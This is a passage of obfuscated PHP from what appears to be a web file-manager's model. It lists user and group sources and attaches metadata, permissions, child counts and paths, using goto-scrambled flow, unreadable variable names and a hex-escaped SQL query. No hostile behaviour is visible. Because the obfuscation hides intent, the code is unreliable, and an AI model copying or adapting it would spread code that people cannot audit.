goto c­Ç’÷•í; a”¹Ëø¹¢à: $bóÁà÷É‚¾ =& $_SERVER[ì‹É]; $BÛ‚†™ƒ»Ÿ = Model($bóÁà÷É‚¾[378])->listData(); $CÕŒºÙÂª = array_filter_by_field($BÛ‚†™ƒ»Ÿ, $bóÁà÷É‚¾[29], $bóÁà÷É‚¾[379]); goto BêæàİÙä¥; BêæàİÙä¥: $CÕŒºÙÂª = array_to_keyvalue($CÕŒºÙÂª, $bóÁà÷É‚¾[33], $bóÁà÷É‚¾[76]); if ($CÕŒºÙÂª) { $cÁ¡ëÜò–õ = $this->listSource(array($bóÁà÷É‚¾[380] => array($bóÁà÷É‚¾[381], $CÕŒºÙÂª))); } $cÁ¡ëÜò–õ = array_to_keyvalue($cÁ¡ëÜò–õ[$bóÁà÷É‚¾[350]], $bóÁà÷É‚¾[366]); goto C‡•Ûô•„; c­Ç’÷•í: } public function listUserTag($fùß‰Æ±èß) { goto Aµ¼§ˆõ£™; bâ™†ê¡…æ: $E×…æŸââ = array_to_keyvalue($E×…æŸââ, $aí¢¬Ğ„Ã[33], $aí¢¬Ğ„Ã[76]); if (!$E×…æŸââ) { return array(); } $DÃ˜·é¨¸ = array($aí¢¬Ğ„Ã[380] => array($aí¢¬Ğ„Ã[381], $E×…æŸââ)); goto C´£Õ©‹·; Aµ¼§ˆõ£™: $aí¢¬Ğ„Ã =& $_SERVER[ì‹É]; $f“Ş´¿‘²İ = Model($aí¢¬Ğ„Ã[389])->listData(); $E×…æŸââ = array_filter_by_field($f“Ş´¿‘²İ, $aí¢¬Ğ„Ã[390], $fùß‰Æ±èß); goto bâ™†ê¡…æ; C´£Õ©‹·: return $this->listSource($DÃ˜·é¨¸); goto B¡”ÏÑßÂ±; B¡”ÏÑßÂ±: } public function listUserRecycle() { $EÏ§êÎ¯ =& $_SERVER[ì‹É]; $A¦Ôôİô = Model($EÏ§êÎ¯[391])->listData(); if (!$A¦Ôôİô) { return array(); } $bÜ¾‹—“¼õ = array($EÏ§êÎ¯[380] => array($EÏ§êÎ¯[381], $A¦Ôôİô), $EÏ§êÎ¯[392] => 1); return $this->listSource($bÜ¾‹—“¼õ); } public function listSource($A©Ç‰Šš, $F£ßÊ¸àÈ® = 3000) { goto F‚±ÆÛòÓè; F‚±ÆÛòÓè: $e¨Û¥µ‚ =& $_SERVER[ì‹É]; if (!isset($A©Ç‰Šš[$e¨Û¥µ‚[393]])) { $A©Ç‰Šš[$e¨Û¥µ‚[393]] = 0; } $Aß‰×‚ƒ£— = $e¨Û¥µ‚[394]; goto Fª¹î‹•Ş•; Fª¹î‹•Ş•: $e‡¸ä¨ÏÓö = $this->field($Aß‰×‚ƒ£—)->_makeOrder()->where($A©Ç‰Šš)->selectPage($F£ßÊ¸àÈ®); $this->_listDataApply($e‡¸ä¨ÏÓö[$e¨Û¥µ‚[350]]); $this->_listMake($e‡¸ä¨ÏÓö); goto FéêŒÆé“; FéêŒÆé“: return $e‡¸ä¨ÏÓö; goto dá‡»ññí; dá‡»ññí: } protected function _makeOrder() { goto b…¶ÚœŒ¢; DŠ˜Û¾¦¶: if ($DÈá–ÍáÁ³ == $Dİò¨é§æ®[28]) { } $F†ØÏ› Û³ = $Dİò¨é§æ®[405] . $EéÜ¥Åğîñ[$DÈá–ÍáÁ³] . $Dİò¨é§æ®[50] . $F•Å‰¦‚ø[$A«àÃÓ™“ù]; return $this->order(rtrim(trim($F†ØÏ› Û³), $Dİò¨é§æ®[47])); goto aš¾ÕªÖÄ; få ğù¼‰: $F•Å‰¦‚ø = array($Dİò¨é§æ®[398] => $Dİò¨é§æ®[399], $Dİò¨é§æ®[400] => $Dİò¨é§æ®[401]); $EéÜ¥Åğîñ = array($Dİò¨é§æ®[28] => $Dİò¨é§æ®[28], $Dİò¨é§æ®[78] => $Dİò¨é§æ®[78], $Dİò¨é§æ®[157] => $Dİò¨é§æ®[369], $Dİò¨é§æ®[375] => $Dİò¨é§æ®[375], $Dİò¨é§æ®[402] => $Dİò¨é§æ®[376], $Dİò¨é§æ®[184] => $Dİò¨é§æ®[184], $Dİò¨é§æ®[108] => $Dİò¨é§æ®[108]); $DÈá–ÍáÁ³ = Input::get($Dİò¨é§æ®[403], $Dİò¨é§æ®[7], $DÒš¨Ÿ×¦, array_keys($EéÜ¥Åğîñ)); goto d§†èÑõÂ; d§†èÑõÂ: $A«àÃÓ™“ù = Input::get($Dİò¨é§æ®[404], $Dİò¨é§æ®[7], $cÈøŒŠ¿“, array_keys($F•Å‰¦‚ø)); if (!in_array($DÈá–ÍáÁ³, array_keys($EéÜ¥Åğîñ))) { $DÈá–ÍáÁ³ = $Dİò¨é§æ®[28]; } if (!in_array($A«àÃÓ™“ù, array_keys($F•Å‰¦‚ø))) { $DÈá–ÍáÁ³ = $Dİò¨é§æ®[398]; } goto DŠ˜Û¾¦¶; b…¶ÚœŒ¢: $Dİò¨é§æ® =& $_SERVER[ì‹É]; $DÒš¨Ÿ×¦ = Model($Dİò¨é§æ®[395])->get($Dİò¨é§æ®[396]); $cÈøŒŠ¿“ = Model($Dİò¨é§æ®[395])->get($Dİò¨é§æ®[397]); goto få ğù¼‰; aš¾ÕªÖÄ: } protected function _listDataApplyItem($AÑ¬Íø’¢‡, $a¦Œ«•±Õ† = false) { $f­ÄÖÈØÑå = array($AÑ¬Íø’¢‡); $this->_listDataApply($f­ÄÖÈØÑå, $a¦Œ«•±Õ†); return $f­ÄÖÈØÑå[0]; } protected function _listDataApply(&$b«òÁèÂâ, $d§ºÛŸ˜ªá = false) { goto fä›¾±ÜÑ ; f¹ïŞë»Ô: $this->_listAppendPath($b«òÁèÂâ); $this->_listAppendAuth($b«òÁèÂâ); $this->_listAppendSourceInfo($b«òÁèÂâ, $bŠËï™¯ä); goto AÃË×£ø; AÃË×£ø: $this->_listAppendUser($b«òÁèÂâ); $this->_listFilterInfo($b«òÁèÂâ, $d§ºÛŸ˜ªá); goto E™»…İ½·; fä›¾±ÜÑ : $C¸›†­Š´Ì =& $_SERVER[ì‹É]; if (!$b«òÁèÂâ) { $b«òÁèÂâ = array(); return; } $bŠËï™¯ä = array_to_keyvalue($b«òÁèÂâ, $C¸›†­Š´Ì[33], $C¸›†­Š´Ì[366]); goto cİ©¦ƒñã³; cİ©¦ƒñã³: $bŠËï™¯ä = array_unique($bŠËï™¯ä); $this->_listSourceCache($b«òÁèÂâ); if (!$d§ºÛŸ˜ªá) { $this->_listAppendMeta($b«òÁèÂâ, $bŠËï™¯ä); $this->_listAppendFileMeta($b«òÁèÂâ, $bŠËï™¯ä); $this->_listAppendChildren($b«òÁèÂâ, $bŠËï™¯ä); } goto f¹ïŞë»Ô; E™»…İ½·: } protected function _listSourceCache($b¨¯œ¼‚•‡) { $då‹ÇöŞİÔ =& $_SERVER[ì‹É]; foreach ($b¨¯œ¼‚•‡ as $b®Œ¹‚Œî¼) { self::$cacheSourceInfo[$då‹ÇöŞİÔ[406] . $b®Œ¹‚Œî¼[$då‹ÇöŞİÔ[366]]] = $b®Œ¹‚Œî¼; } } protected function _listFilterInfo(&$d©•ğøÓ×ô, $EÜ¨‡˜•˜ = false) { $B‚ĞÍƒÄ†­ =& $_SERVER[ì‹É]; foreach ($d©•ğøÓ×ô as &$Açëõ¶ÉÃ·) { $Açëõ¶ÉÃ· = $this->pathInfoFilter($Açëõ¶ÉÃ·); self::$cachePathInfo[$B‚ĞÍƒÄ†­[407] . intval($EÜ¨‡˜•˜) . $B‚ĞÍƒÄ†­[408] . $Açëõ¶ÉÃ·[$B‚ĞÍƒÄ†­[366]]] = $Açëõ¶ÉÃ·; } } protected function _listMake(&$A ‡íß¹¥) { $B½ĞøÎ…ˆ =& $_SERVER[ì‹É]; $A ‡íß¹¥[$B½ĞøÎ…ˆ[75]] = array(); $A ‡íß¹¥[$B½ĞøÎ…ˆ[74]] = array(); foreach ($A ‡íß¹¥[$B½ĞøÎ…ˆ[350]] as $B§‚åí­Ã„) { $bÏ›½„ã£É = $B§‚åí­Ã„[$B½ĞøÎ…ˆ[367]] == 1 ? $B½ĞøÎ…ˆ[75] : $B½ĞøÎ…ˆ[74]; $A ‡íß¹¥[$bÏ›½„ã£É][] = $B§‚åí­Ã„; } unset($A ‡íß¹¥[$B½ĞøÎ…ˆ[350]]); } protected function _listAppendMeta(&$Cà†“Úô¤Ï, $aÜ§ĞÙæ) { goto fâçã»ÜÀ»; fâçã»ÜÀ»: $dÔ¯ë™Èã =& $_SERVER[ì‹É]; $EÊíäíƒ­« = array($dÔ¯ë™Èã[380] => array($dÔ¯ë™Èã[381], $aÜ§ĞÙæ)); $AôíÚŞÎ…‹ = Model($dÔ¯ë™Èã[409])->field($dÔ¯ë™Èã[410])->where($EÊíäíƒ­«)->select(); goto Fè¹˜Õ„ÎÄ; f©£ØÂ¶‡°: foreach ($AôíÚŞÎ…‹ as $aµ¼ËÑ©Ü›) { if (!isset($c¿ÓÓÒ‘±Œ[$aµ¼ËÑ©Ü›[$dÔ¯ë™Èã[366]]])) { $c¿ÓÓÒ‘±Œ[$aµ¼ËÑ©Ü›[$dÔ¯ë™Èã[366]]] = array(); } if (in_array($aµ¼ËÑ©Ü›[$dÔ¯ë™Èã[90]], $d×°ªÇã¡†)) { continue; } $c¿ÓÓÒ‘±Œ[$aµ¼ËÑ©Ü›[$dÔ¯ë™Èã[366]]][$aµ¼ËÑ©Ü›[$dÔ¯ë™Èã[90]]] = $aµ¼ËÑ©Ü›[$dÔ¯ë™Èã[354]]; } foreach ($Cà†“Úô¤Ï as &$bìóÜ’çÌÃ) { $bìóÜ’çÌÃ[$dÔ¯ë™Èã[413]] = !1; if (isset($c¿ÓÓÒ‘±Œ[$bìóÜ’çÌÃ[$dÔ¯ë™Èã[366]]])) { $bìóÜ’çÌÃ[$dÔ¯ë™Èã[413]] = $c¿ÓÓÒ‘±Œ[$bìóÜ’çÌÃ[$dÔ¯ë™Èã[366]]]; } if ($this->fileIsLock($bìóÜ’çÌÃ) && $bìóÜ’çÌÃ[$dÔ¯ë™Èã[373]]) { $eÛƒÒ†‚Šê = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $bìóÜ’çÌÃ[$dÔ¯ë™Èã[373]][$dÔ¯ë™Èã[374]] = AuthModel::authDisable($bìóÜ’çÌÃ[$dÔ¯ë™Èã[373]][$dÔ¯ë™Èã[374]], $eÛƒÒ†‚Šê); $bìóÜ’çÌÃ[$dÔ¯ë™Èã[373]][$dÔ¯ë™Èã[414]][$dÔ¯ë™Èã[373]] = $bìóÜ’çÌÃ[$dÔ¯ë™Èã[373]][$dÔ¯ë™Èã[374]]; } } goto A‘ƒ¸ö½Çİ; Fè¹˜Õ„ÎÄ: if (!$AôíÚŞÎ…‹) { return; } $d×°ªÇã¡† = array($dÔ¯ë™Èã[411], $dÔ¯ë™Èã[412]); $c¿ÓÓÒ‘±Œ = array(); goto f©£ØÂ¶‡°; A‘ƒ¸ö½Çİ: } protected function _listAppendFileMeta(&$Fï°ßŞÀ÷…, $B‹­‹ù‹Û·) { goto Fö›â™äœä; féÃßËİ¸: $bµÇ™È›ÏÏ = Model($Cà¡š•ï†â[418])->field($EƒÖóÂôŠª)->where($c½İºî÷”)->select(); $bµÇ™È›ÏÏ = array_to_keyvalue($bµÇ™È›ÏÏ, $Cà¡š•ï†â[415]); $A´¤¡Óçåà = Model($Cà¡š•ï†â[419])->field($Cà¡š•ï†â[420])->where($c½İºî÷”)->select(); goto Aë±„Ó´´Š; Fô§”™†Ò—: if (!$AÈÔ¤‡ùØ) { return; } $c½İºî÷” = array($Cà¡š•ï†â[416] => array($Cà¡š•ï†â[381], $AÈÔ¤‡ùØ)); $EƒÖóÂôŠª = $Cà¡š•ï†â[417]; goto féÃßËİ¸; Aë±„Ó´´Š: $A´¤¡Óçåà = $A´¤¡Óçåà ? $A´¤¡Óçåà : array(); $BÙ‹°‹á = array(); foreach ($A´¤¡Óçåà as $EÚë‰±‘ğ¥) { if (!isset($BÙ‹°‹á[$EÚë‰±‘ğ¥[$Cà¡š•ï†â[415]]])) { $BÙ‹°‹á[$EÚë‰±‘ğ¥[$Cà¡š•ï†â[415]]] = array(); } $BÙ‹°‹á[$EÚë‰±‘ğ¥[$Cà¡š•ï†â[415]]][$EÚë‰±‘ğ¥[$Cà¡š•ï†â[90]]] = $EÚë‰±‘ğ¥[$Cà¡š•ï†â[354]]; } goto D¬Çåš¢•Ô; D¬Çåš¢•Ô: foreach ($Fï°ßŞÀ÷… as &$B„÷š§¾À) { goto Eƒù‘šÉÔƒ; c°ß§¸‚Ô: unset($bµÇ™È›ÏÏ[$Föø“ê¾†Á][$Cà¡š•ï†â[76]]); $aÉ•®«Ã™Î = is_array($BÙ‹°‹á[$Föø“ê¾†Á]) ? $BÙ‹°‹á[$Föø“ê¾†Á] : array(); $B„÷š§¾À[$Cà¡š•ï†â[159]] = array_merge($aÉ•®«Ã™Î, $bµÇ™È›ÏÏ[$Föø“ê¾†Á]); goto Cƒ´‡÷¹Šª; EìšÀõéİ—: $cÓĞ©é™˜¨[$Cà¡š•ï†â[78]] = $B„÷š§¾À[$Cà¡š•ï†â[78]]; $cÓĞ©é™˜¨[$Cà¡š•ï†â[28]] = $B„÷š§¾À[$Cà¡š•ï†â[28]]; self::$cacheFileInfo[$Cà¡š•ï†â[421] . $Föø“ê¾†Á] = $cÓĞ©é™˜¨; goto c°ß§¸‚Ô; Cƒ´‡÷¹Šª: if (isset($B„÷š§¾À[$Cà¡š•ï†â[159]][$Cà¡š•ï†â[422]])) { $B„÷š§¾À[$Cà¡š•ï†â[422]] = json_decode($B„÷š§¾À[$Cà¡š•ï†â[159]][$Cà¡š•ï†â[422]], !0); unset($B„÷š§¾À[$Cà¡š•ï†â[159]][$Cà¡š•ï†â[422]]); } goto c …®„ƒìÒ; Eƒù‘šÉÔƒ: $Föø“ê¾†Á = $B„÷š§¾À[$Cà¡š•ï†â[415]]; if (!$Föø“ê¾†Á || !isset($bµÇ™È›ÏÏ[$Föø“ê¾†Á])) { continue; } $cÓĞ©é™˜¨ = $bµÇ™È›ÏÏ[$Föø“ê¾†Á]; goto EìšÀõéİ—; c …®„ƒìÒ: } goto f‰©‚¤ñ§À; Fö›â™äœä: $Cà¡š•ï†â =& $_SERVER[ì‹É]; $AÈÔ¤‡ùØ = array_to_keyvalue($Fï°ßŞÀ÷…, $Cà¡š•ï†â[33], $Cà¡š•ï†â[415]); $AÈÔ¤‡ùØ = array_filter(array_unique($AÈÔ¤‡ùØ)); goto Fô§”™†Ò—; f‰©‚¤ñ§À: } protected function _listAppendSourceInfo(&$aã¿õæáó«, $B—ÑŞğƒ—§) { goto F»ãÖ§’¢™; cËŠÛáĞÙ: $fò¥†Á÷Ğœ = Model($A·…‰Ü²Ö§[389])->listData(); $C¼ÖâØÖÊ‘ = Model($A·…‰Ü²Ö§[378])->listData(); $fäÎ˜…É = Model($A·…‰Ü²Ö§[425])->listSimple(); goto båÒì·‚œ›; bìŠÇÛ…ª: $BÊÀ›»Ì§ë = array_to_keyvalue_group($fäÎ˜…É, $A·…‰Ü²Ö§[366]); foreach ($aã¿õæáó« as &$f”Š­„Šç) { $f”Š­„Šç[$A·…‰Ü²Ö§[388]] = array($A·…‰Ü²Ö§[426] => 0, $A·…‰Ü²Ö§[427] => 0, $A·…‰Ü²Ö§[428] => 0); if (isset($D™º¨ï¥ä[$f”Š­„Šç[$A·…‰Ü²Ö§[366]]])) { $f”Š­„Šç[$A·…‰Ü²Ö§[388]][$A·…‰Ü²Ö§[429]] = 1; $f”Š­„Šç[$A·…‰Ü²Ö§[388]][$A·…‰Ü²Ö§[430]] = $D™º¨ï¥ä[$f”Š­„Šç[$A·…‰Ü²Ö§[366]]][$A·…‰Ü²Ö§[28]]; } if (isset($a°•…áãö[$f”Š­„Šç[$A·…‰Ü²Ö§[366]]])) { $f”Š­„Šç[$A·…‰Ü²Ö§[388]][$A·…‰Ü²Ö§[431]] = array(); foreach ($a°•…áãö[$f”Š­„Šç[$A·…‰Ü²Ö§[366]]] as $bØò¾¨£÷µ) { $fœ¸ÒÛ¨ = $D“ƒâÎğ¯Á[$bØò¾¨£÷µ]; $f”Š­„Šç[$A·…‰Ü²Ö§[388]][$A·…‰Ü²Ö§[431]][] = array($A·…‰Ü²Ö§[432] => $fœ¸ÒÛ¨[$A·…‰Ü²Ö§[364]], $A·…‰Ü²Ö§[383] => $fœ¸ÒÛ¨[$A·…‰Ü²Ö§[28]], $A·…‰Ü²Ö§[433] => $fœ¸ÒÛ¨[$A·…‰Ü²Ö§[434]]); } } if (isset($BÊÀ›»Ì§ë[$f”Š­„Šç[$A·…‰Ü²Ö§[366]]])) { $f”Š­„Šç[$A·…‰Ü²Ö§[388]][$A·…‰Ü²Ö§[435]] = array(); foreach ($BÊÀ›»Ì§ë[$f”Š­„Šç[$A·…‰Ü²Ö§[366]]] as $DÔ”·™ñœ”) { $f”Š­„Šç[$A·…‰Ü²Ö§[388]][$A·…‰Ü²Ö§[435]] = array($A·…‰Ü²Ö§[436] => $DÔ”·™ñœ”[$A·…‰Ü²Ö§[437]], $A·…‰Ü²Ö§[438] => $DÔ”·™ñœ”[$A·…‰Ü²Ö§[439]], $A·…‰Ü²Ö§[440] => $DÔ”·™ñœ”[$A·…‰Ü²Ö§[366]], $A·…‰Ü²Ö§[441] => $DÔ”·™ñœ”[$A·…‰Ü²Ö§[442]], $A·…‰Ü²Ö§[443] => $DÔ”·™ñœ”[$A·…‰Ü²Ö§[444]]); } } } return $aã¿õæáó«; goto c®˜Øƒµêˆ; båÒì·‚œ›: $D“ƒâÎğ¯Á = array_to_keyvalue($a²±ÒÓóŠ, $A·…‰Ü²Ö§[364]); $a°•…áãö = array_to_keyvalue_group($fò¥†Á÷Ğœ, $A·…‰Ü²Ö§[76], $A·…‰Ü²Ö§[390]); $D™º¨ï¥ä = array_to_keyvalue($C¼ÖâØÖÊ‘, $A·…‰Ü²Ö§[76]); goto bìŠÇÛ…ª; F»ãÖ§’¢™: $A·…‰Ü²Ö§ =& $_SERVER[ì‹É]; if (!defined($A·…‰Ü²Ö§[423])) { return; } $a²±ÒÓóŠ = Model($A·…‰Ü²Ö§[424])->listData(); goto cËŠÛáĞÙ; c®˜Øƒµêˆ: } protected function _listAppendChildren(&$A·Ü¢ÖÏ™, $aËÖÀ—İŒ) { goto E—Ô†„¢Ú; DÓŠ×‰Ñ·¢: $EÇ””ÑŒÙ = 1024 * 50; $f£•ñù×‘Ä = count($A·Ü¢ÖÏ™); $CŠäé÷ÑØ = $this->tablePrefix . $this->tableName; goto e½ÁÛ‘ó±Ú; E—Ô†„¢Ú: $fÈ’±—Ë =& $_SERVER[ì‹É]; $aß‡™†Ùø¥ = $fÈ’±—Ë[358]; $f‘·¸Ä±Ì = array(); goto DÓŠ×‰Ñ·¢; e½ÁÛ‘ó±Ú: for ($D÷ˆŠ£Ä›Ø = 0; $D÷ˆŠ£Ä›Ø < $f£•ñù×‘Ä; $D÷ˆŠ£Ä›Ø++) { if ($A·Ü¢ÖÏ™[$D÷ˆŠ£Ä›Ø][$fÈ’±—Ë[367]]) { $E„ËÃÍËßµ = $A·Ü¢ÖÏ™[$D÷ˆŠ£Ä›Ø][$fÈ’±—Ë[366]]; $aß‡™†Ùø¥ .= "\123\x45\114\105\103\x54\x20\52\x20\106\122\x4f\x4d\40\50\x53\105\x4c\x45\103\x54\x20\47{$E„ËÃÍËßµ}\x5f\x68\141\163\106\151\x6c\x65\x27\40\141\x73\40\150\x61\163\54\x63\x6f\x75\x6e\164\x28\x31\x29\40\x61\x73\x20\x68\141\163\103\157\x75\156\x74\40\x46\x52\117\115\x20\x60{$CŠäé÷ÑØ}\x60\40\xa\11\x9\x9\11\x9\x77\150\145\162\145\40\x70\x61\162\x65\156\164\x49\104\75{$E„ËÃÍËßµ}\40\x61\x6e\x64\40\151\163\106\157\154\144\x65\162\x3d\x30\40\141\156\144\x20\x69\x73\104\145\154\x65\x74\145\75\60\x29\x20\141\163\40\164\142\x31\137{$E„ËÃÍËßµ}\x20\165\156\x69\157\156\40\141\x6c\x6c\40\xa\x9\x9\11\x9\x9\x53\x45\x4c\x45\x43\124\x20\52\x20\x46\122\117\115\40\50\123\x45\114\105\103\x54\40\47{$E„ËÃÍËßµ}\137\150\141\163\x46\x6f\x6c\x64\145\x72\47\40\x61\163\x20\150\x61\163\x46\x69\154\x65\54\143\x6f\165\156\x74\50\x31\51\40\141\163\40\x68\141\x73\103\x6f\165\156\x74\40\106\x52\x4f\x4d\40\140{$CŠäé÷ÑØ}\140\x20\12\x9\x9\x9\x9\x9\x77\x68\145\162\x65\40\160\141\x72\145\156\x74\x49\x44\75{$E„ËÃÍËßµ}\x20\x61\156\144\40\151\x73\x46\157\x6c\x64\x65\162\x3d\61\x20\x61\156\144\x20\151\x73\104\145\154\145\164\145\x3d\60\51\40\x61\x73\x20\164\142\x32\137{$E„ËÃÍËßµ}\x20\165\156\x69\x6f\x6e\40\x61\154\x6c\x20"; } if ((strlen($aß‡™†Ùø¥) >= $EÇ””ÑŒÙ || $D÷ˆŠ£Ä›Ø == $f£•ñù×‘Ä - 1) && $aß‡™†Ùø¥) { $aß‡™†Ùø¥ = substr($aß‡™†Ùø¥, 0, -strlen($fÈ’±—Ë[445])); $Bš×êºÛ = $this->query($aß‡™†Ùø¥); $f‘·¸Ä±Ì = array_merge($f‘·¸Ä±Ì, $Bš×êºÛ); $aß‡™†Ùø¥ = $fÈ’±—Ë[33]; } } $f‘·¸Ä±Ì = array_to_keyvalue($f‘·¸Ä±Ì, $fÈ’±—Ë[446]); foreach ($A·Ü¢ÖÏ™ as &$b˜³©ÇÒ) { if ($b˜³©ÇÒ[$fÈ’±—Ë[367]]) { unset($b˜³©ÇÒ[$fÈ’±—Ë[369]]); $b˜³©ÇÒ[$fÈ’±—Ë[189]] = intval($f‘·¸Ä±Ì[$b˜³©ÇÒ[$fÈ’±—Ë[366]] . $fÈ’±—Ë[447]][$fÈ’±—Ë[448]]); $b˜³©ÇÒ[$fÈ’±—Ë[188]] = intval($f‘·¸Ä±Ì[$b˜³©ÇÒ[$fÈ’±—Ë[366]] . $fÈ’±—Ë[449]][$fÈ’±—Ë[448]]); } } goto bêÁÖâñ; bêÁÖâñ: } protected function _listAppendAuth(&$d¼èš•Æ“) { goto b’Ÿí—ïÆ³; cŒÕ“›‚Ã: $bƒ‡›²ğ³¿ = Model($bôâÓñÍÃÒ[450])->getSourceList($aí«ˆÍƒÎÂ, $aòé‰çÛ¹í); foreach ($d¼èš•Æ“ as $aÍáŞ·©§ => &$Déºè‰Ì) { $Déºè‰Ì[$bôâÓñÍÃÒ[373]] = $bƒ‡›²ğ³¿[$Déºè‰Ì[$bôâÓñÍÃÒ[366]]]; if (!$Déºè‰Ì[$bôâÓñÍÃÒ[373]] && $Déºè‰Ì[$bôâÓñÍÃÒ[368]] == self::TYPE_GROUP) { $Déºè‰Ì[$bôâÓñÍÃÒ[373]] = Action($bôâÓñÍÃÒ[451])->pathGroupAuthMake($Déºè‰Ì[$bôâÓñÍÃÒ[452]]); if (!$Déºè‰Ì[$bôâÓñÍÃÒ[373]] && !$GLOBALS[$bôâÓñÍÃÒ[453]]) { $Déºè‰Ì[$bôâÓñÍÃÒ[186]] = !1; $Déºè‰Ì[$bôâÓñÍÃÒ[185]] = !1; } } if ($Déºè‰Ì[$bôâÓñÍÃÒ[373]]) { $Déºè‰Ì[$bôâÓñÍÃÒ[186]] = AuthModel::authCheckEdit($Déºè‰Ì[$bôâÓñÍÃÒ[373]][$bôâÓñÍÃÒ[374]]); $Déºè‰Ì[$bôâÓñÍÃÒ[185]] = AuthModel::authCheckView($Déºè‰Ì[$bôâÓñÍÃÒ[373]][$bôâÓñÍÃÒ[374]]); } $this->groupPathDisplay($Déºè‰Ì); } goto FÄÀ¢œ†Ñ; dÄ…¾»İÃì: foreach ($d¼èš•Æ“ as $Déºè‰Ì) { if ($Déºè‰Ì[$bôâÓñÍÃÒ[368]] == self::TYPE_GROUP) { $aí«ˆÍƒÎÂ[] = $Déºè‰Ì[$bôâÓñÍÃÒ[366]]; } } if (!$aí«ˆÍƒÎÂ) { return; } $aòé‰çÛ¹í = array_to_keyvalue($d¼èš•Æ“, $bôâÓñÍÃÒ[366]); goto cŒÕ“›‚Ã; b’Ÿí—ïÆ³: $bôâÓñÍÃÒ =& $_SERVER[ì‹É]; if (!defined($bôâÓñÍÃÒ[423])) { return; } $aí«ˆÍƒÎÂ = array(); goto dÄ…¾»İÃì; FÄÀ¢œ†Ñ: } public function groupPathDisplay(&$d”¦†ÈéŞ‰) { goto cìä°Ş‚’¥; b¶åÚ›¼µÒ: $d”¦†ÈéŞ‰[$e‘ß„×ßêÃ[456]] = $CÎ­ØË‚ˆ[$e‘ß„×ßêÃ[457]]; $d”¦†ÈéŞ‰[$e‘ß„×ßêÃ[377]] = $CÎ­ØË‚ˆ[$e‘ß„×ßêÃ[455]]; $d”¦†ÈéŞ‰[$e‘ß„×ßêÃ[458]] = $CÎ­ØË‚ˆ[$e‘ß„×ßêÃ[459]]; goto a«”‘ç«‚Å; cìä°Ş‚’¥: $e‘ß„×ßêÃ =& $_SERVER[ì‹É]; if ($d”¦†ÈéŞ‰[$e‘ß„×ßêÃ[368]] != self::TYPE_GROUP) { return; } $CÎ­ØË‚ˆ = Model($e‘ß„×ßêÃ[454])->getInfo($d”¦†ÈéŞ‰[$e‘ß„×ßêÃ[452]]); goto AØíŸĞ¦ó; AØíŸĞ¦ó: $F‡õ‘àÂó´ = $this->parentLevelArray($CÎ­ØË‚ˆ[$e‘ß„×ßêÃ[455]]); $bŸŸÎîÑŠë = $e‘ß„×ßêÃ[33]; foreach ($F‡õ‘àÂó´ as $Dæ¦‡ªÂƒ¬) { $aîòóÚ  = Model($e‘ß„×ßêÃ[454])->getInfo($Dæ¦‡ªÂƒ¬); $bŸŸÎîÑŠë .= $aîòóÚ [$e‘ß„×ßêÃ[388]][$e‘ß„×ßêÃ[366]] . $e‘ß„×ßêÃ[47]; } goto b¶åÚ›¼µÒ; a«”‘ç«‚Å: $d”¦†ÈéŞ‰[$e‘ß„×ßêÃ[460]] = $bŸŸÎîÑŠë . $CÎ­ØË‚ˆ[$e‘ß„×ßêÃ[388]][$e‘ß„×ßêÃ[366]]; goto DÌ¤·óÂ†½; DÌ¤·óÂ†½: } protected function _listAppendPath(&$d‡åò„»÷Ì) { goto Bù„Çöòí¼; C„Âó‰Œ ø: $Bñ˜ë‘İ‘ô = array(); foreach ($b®µÌ‘·å¢ as $bÂîÒØ´Íï => $cÓßåêÍ‹­) { if (!$cÓßåêÍ‹­) { $Bñ˜ë‘İ‘ô[] = $bÂîÒØ´Íï; } } if ($Bñ˜ë‘İ‘ô) { $e´”åŒ½Ä’ = array($eê…ïœÀÌ[380] => array($eê…ïœÀÌ[381], $Bñ˜ë‘İ‘ô)); if (count($Bñ˜ë‘İ‘ô) == 1) { $dà‘‹Üò = $this->sourceInfo($Bñ˜ë‘İ‘ô[0]); $dà‘‹Üò = is_array($dà‘‹Üò) ? array($dà‘‹Üò) : !1; } else { $dà‘‹Üò = $this->field($eê…ïœÀÌ[461])->where($e´”åŒ½Ä’)->select(); } $b½®ÆŒé›” = array_to_keyvalue($dà‘‹Üò, $eê…ïœÀÌ[366], $eê…ïœÀÌ[28]); $b®µÌ‘·å¢ = array_merge_index($b®µÌ‘·å¢, $b½®ÆŒé›”); } goto B¥ÈÍÑÒê; Bù„Çöòí¼: $eê…ïœÀÌ =& $_SERVER[ì‹É]; $b®µÌ‘·å¢ = array(); foreach ($d‡åò„»÷Ì as &$FŒĞªƒÊêâ) { $b®µÌ‘·å¢[$FŒĞªƒÊêâ[$eê…ïœÀÌ[366]]] = $FŒĞªƒÊêâ[$eê…ïœÀÌ[28]]; $bôĞôÓ°¥§ = $this->parentLevelArray($FŒĞªƒÊêâ[$eê…ïœÀÌ[455]]); array_shift($bôĞôÓ°¥§); foreach ($bôĞôÓ°¥§ as $c‡§ğËÕì) { if (!isset($b®µÌ‘·å¢[$c‡§ğËÕì])) { $b®µÌ‘·å¢[$c‡§ğËÕì] = 0; } } } goto C„Âó‰Œ ø; B¥ÈÍÑÒê: foreach ($d‡åò„»÷Ì as &$FŒĞªƒÊêâ) { goto a™á‚³ÕÓ; C¥”’òŠğ¤: $FÏ–é£ºğ = trim($FŒĞªƒÊêâ[$eê…ïœÀÌ[462]], $eê…ïœÀÌ[8]); if ($FŒĞªƒÊêâ[$eê…ïœÀÌ[457]] == $eê…ïœÀÌ[464] && $FÏ–é£ºğ) { $FŒĞªƒÊêâ[$eê…ïœÀÌ[28]] = $FÏ–é£ºğ; } goto E©í¡™‰¨; a™á‚³ÕÓ: $bôĞôÓ°¥§ = $this->parentLevelArray($FŒĞªƒÊêâ[$eê…ïœÀÌ[455]]); $b¬Ú³Š“ÉÂ = $this->_listAppendPathRoot($FŒĞªƒÊêâ, $bôĞôÓ°¥§); foreach ($bôĞôÓ°¥§ as $c‡§ğËÕì) { if (isset($b®µÌ‘·å¢[$c‡§ğËÕì])) { $b¬Ú³Š“ÉÂ .= $b®µÌ‘·å¢[$c‡§ğËÕì] . $eê…ïœÀÌ[8]; } } goto dÜÅ‘ä·ˆ•; dÜÅ‘ä·ˆ•: if ($bôĞôÓ°¥§) { $b¬Ú³Š“ÉÂ .= $FŒĞªƒÊêâ[$eê…ïœÀÌ[28]]; } if ($FŒĞªƒÊêâ[$eê…ïœÀÌ[367]]) { $b¬Ú³Š“ÉÂ .= $eê…ïœÀÌ[8]; } $FŒĞªƒÊêâ[$eê…ïœÀÌ[462]] = str_replace($eê…ïœÀÌ[463], $eê…ïœÀÌ[8], $b¬Ú³Š“ÉÂ); goto 